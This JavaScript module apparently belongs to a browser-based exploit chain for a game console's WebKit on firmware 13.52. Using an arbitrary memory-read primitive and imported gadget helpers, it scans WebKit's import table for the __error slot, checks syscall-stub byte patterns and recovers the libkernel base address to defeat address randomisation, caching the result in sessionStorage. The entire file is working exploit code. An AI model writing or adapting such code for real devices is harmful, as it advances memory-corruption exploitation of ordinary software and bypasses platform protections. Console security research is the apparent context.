/**
 * Resolve libSceLibKernelWeb base on 13.52 without reading 13.00 high IAT (+0x3cb8cc8 OOMs).
 */
import { int64 } from "./int64.js";
import { webkitRvaMax } from "./pivot_gadgets.js";

const SS_LK_BASE = "wk-libkernelBase";
const SS_IAT_RVA = "wk-imp-error-rva";

function read8p(p, addr) {
    if (!addr) return null;
    try { return p.read8(addr); } catch (_) { return null; }
}

function read4p(p, addr) {
    if (!addr) return null;
    try { return p.read4(addr); } catch (_) { return null; }
}

function parseAddrSync(raw) {
    if (!raw) return null;
    const s = String(raw).replace(/^0x/i, "").trim();
    if (!s) return null;
    const n = BigInt("0x" + s);
    return new int64(Number(n & 0xffffffffn), Number((n >> 32n) & 0xffffffffn));
}

export function isGetpidStub(v) {
    if (!v) return false;
    return (v.low & 0x00ffffff) === 0xc0c748
        && (v.hi >>> 24) === 0x49
        && (((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0) === 20;
}

export function isLibkernelPrologue(p, lk) {
    if (!lk) return false;
    const w0 = read4p(p, lk);
    const w1 = read4p(p, lk.add32(4));
    return w0 != null && w1 != null
        && (w0 & 0xff) === 0xb8
        && (w1 & 0xffff) === 0x050f;
}

function iatRvaAllowed(rva, off) {
    return rva >= 0x10000 && rva <= webkitRvaMax(off);
}

function loadSessionIatRva() {
    try {
        const n = parseInt(sessionStorage.getItem(SS_IAT_RVA), 16);
        return n > 0 ? n : null;
    } catch (_) {
        return null;
    }
}

export function saveLibkernelSession(lk, iatRva) {
    try {
        if (lk) sessionStorage.setItem(SS_LK_BASE, String(lk));
        if (iatRva != null) sessionStorage.setItem(SS_IAT_RVA, iatRva.toString(16));
    } catch (_) { }
}

function lkFromIatSlot(p, webkitBase, rva, off, read8) {
    const errorFn = read8(p, webkitBase.add32(rva));
    if (!errorFn || (errorFn.hi === 0 && errorFn.low < 0x100000)) return null;
    const lk = errorFn.sub32(off.k__error);
    if (!isLibkernelPrologue(p, lk)) return null;
    return { lk, iatRva: rva, errorFn };
}

/**
 * Scan mapped webkit for __imp___error GOT slot.
 */
export function scanErrorIat(p, webkitBase, off, opts) {
    opts = opts || {};
    const read8 = opts.read8 || ((pp, a) => read8p(pp, a));
    const cap = webkitRvaMax(off);
    const minRva = opts.minRva != null ? opts.minRva : 0x100000;
    const maxRva = Math.min(opts.maxRva != null ? opts.maxRva : cap, cap);
    const step = opts.step || 8;
    let best = null;
    for (let rva = minRva; rva < maxRva; rva += step) {
        const hit = lkFromIatSlot(p, webkitBase, rva, off, read8);
        if (!hit) continue;
        if (!best || rva < best.iatRva) best = hit;
    }
    if (!best) return null;
    return {
        lk: best.lk,
        iatRva: best.iatRva,
        errorFn: best.errorFn,
        source: "scan",
    };
}

/**
 * Chunked IAT scan — call in a loop until result.done.
 */
export function scanErrorIatChunk(p, webkitBase, off, state) {
    const cap = webkitRvaMax(off);
    if (!state) {
        state = {
            cursor: 0x800000,
            maxRva: cap,
            step: 8,
            chunk: 2048,
            best: null,
        };
    }
    let steps = 0;
    while (state.cursor < state.maxRva && steps < state.chunk) {
        const hit = lkFromIatSlot(p, webkitBase, state.cursor, off, read8p);
        if (hit && (!state.best || state.cursor < state.best.iatRva))
            state.best = hit;
        state.cursor += state.step;
        steps++;
    }
    state.done = state.cursor >= state.maxRva;
    if (state.done && state.best) {
        saveLibkernelSession(state.best.lk, state.best.iatRva);
        return {
            done: true,
            lk: state.best.lk,
            iatRva: state.best.iatRva,
            source: "scan-chunk",
            state,
        };
    }
    return {
        done: state.done,
        state,
        lk: state.best ? state.best.lk : null,
        iatRva: state.best ? state.best.iatRva : null,
    };
}

/**
 * Resolve libkernel base — never reads webkit above webkitRvaMax.
 */
export function resolveLibkernel(p, webkitBase, off, opts) {
    opts = opts || {};
    const read8 = opts.read8 || ((pp, a) => read8p(pp, a));
    const log = opts.log || (() => {});

    if (!off || off.k__error == null)
        return { ok: false, error: "missing k__error" };

    try {
        const rawLk = sessionStorage.getItem(SS_LK_BASE);
        if (rawLk) {
            const lk = parseAddrSync(rawLk);
            if (lk && isLibkernelPrologue(p, lk)) {
                log("LK-CACHE", "libkernel " + lk);
                return { ok: true, lk, source: "cache" };
            }
            log("LK-CACHE-BAD", "stale " + rawLk);
        }
    } catch (_) { }

    const savedIat = loadSessionIatRva();
    if (savedIat != null && iatRvaAllowed(savedIat, off)) {
        const hit = lkFromIatSlot(p, webkitBase, savedIat, off, read8);
        if (hit) {
            saveLibkernelSession(hit.lk, hit.iatRva);
            log("LK-IAT", "+0x" + hit.iatRva.toString(16) + " → " + hit.lk);
            return { ok: true, lk: hit.lk, iatRva: hit.iatRva, source: "session-iat" };
        }
    }

    const tableIat = off.wk___imp___error;
    if (tableIat != null && iatRvaAllowed(tableIat, off)) {
        const hit = lkFromIatSlot(p, webkitBase, tableIat, off, read8);
        if (hit) {
            saveLibkernelSession(hit.lk, hit.iatRva);
            log("LK-IAT", "table +0x" + tableIat.toString(16) + " → " + hit.lk);
            return { ok: true, lk: hit.lk, iatRva: hit.iatRva, source: "table" };
        }
    } else if (tableIat != null) {
        log("LK-BLOCK", "13.00 IAT +0x" + tableIat.toString(16) + " unmapped on 13.52");
    }

    if (opts.allowScan === false)
        return { ok: false, error: "no libkernel — tap Scan IAT first" };

    return { ok: false, error: "IAT not cached — tap Scan IAT (chunked)" };
}
